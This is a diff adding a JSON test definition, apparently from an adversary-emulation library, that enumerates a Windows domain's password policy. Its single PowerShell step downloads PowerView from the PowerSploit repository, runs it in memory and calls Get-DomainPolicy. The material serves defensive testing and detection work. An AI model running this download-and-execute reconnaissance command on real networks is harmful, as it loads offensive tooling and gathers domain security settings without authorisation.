@@ -1,0 +1,23 @@
+{
+  "id": "3177f4da-3d4b-4592-8bdc-aa23d0b2e843",
+  "name": "Get-DomainPolicy with PowerView",
+  "description": "Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "aef1e8e6-09a8-4b1d-8e4c-6a07bf8de05c",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1201",
+    "atomic-red-team"
+  ]
+}
